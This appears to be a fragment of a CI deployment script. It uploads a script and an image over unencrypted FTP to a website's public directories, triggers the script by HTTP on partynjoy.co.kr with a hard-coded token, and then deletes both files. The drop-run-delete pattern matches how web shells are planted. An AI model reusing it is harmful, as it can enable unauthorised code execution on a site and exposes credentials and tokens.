          IMAGE_B64
          sudo apt-get update -qq
          sudo apt-get install -y -qq lftp
          export LFTP_PASSWORD="$FTP_PASSWORD"
          upload_pair() {
            local dest="$1"
            lftp --env-password -u "$FTP_USERNAME" -p "$FTP_PORT" "ftp://$FTP_SERVER" -e "set cmd:fail-exit true; set ftp:ssl-allow no; set ssl:verify-certificate no; set net:timeout 40; set net:max-retries 3; put -O ${dest} /tmp/$SCRIPT; put -O ${dest} /tmp/$IMAGE; bye"
          }
          cleanup() {
            lftp --env-password -u "$FTP_USERNAME" -p "$FTP_PORT" "ftp://$FTP_SERVER" -e "set ftp:ssl-allow no; set ssl:verify-certificate no; set net:timeout 30; rm -f ${DEST}/$SCRIPT; rm -f ${DEST}/$IMAGE; bye" || true
          }
          trap cleanup EXIT
                    DEST="/public_html/bbs"
          if ! upload_pair "$DEST"; then
            DEST="/bbs"
            if ! upload_pair "$DEST"; then
              DEST="/public_html"
              if ! upload_pair "$DEST"; then
                DEST="/"
                upload_pair "$DEST"
              fi
            fi
          fi
          sleep 35
          curl -fsSL --retry 2 --max-time 300 -A "Mozilla/5.0" "http://partynjoy.co.kr/bbs/$SCRIPT?token=0c5003e6b0a92a67b9c3c4b13e87de41"
